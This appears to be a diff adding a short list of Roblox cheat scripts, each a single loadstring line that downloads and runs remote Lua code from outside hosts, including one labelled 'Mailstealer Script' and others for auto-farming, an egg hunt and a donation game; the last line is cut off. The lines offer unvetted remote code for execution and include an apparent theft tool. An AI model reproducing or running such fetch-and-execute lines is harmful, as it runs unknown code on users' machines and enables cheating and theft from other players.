@@ -1,0 +1,17 @@
+Mailstealer Script
+loadstring(game:HttpGetAsync("https://bloxscripts.fun/scripts/3100e000aa.lua", true))()
+
+
+
+Egg hunt Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Levi4Chan/Rblx-Scripts/main/Auto-Easter-Egg.lua"))()
+
+
+
+Please donate Script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/SORIX-Hub/main/Pls%20Donate%20V1"))()
+
+
+
+Auto farm script
+loadstring(game:HttpGetAsync("https://gitlab.com/Sky2836/test/-/raw/main/Auth"))(
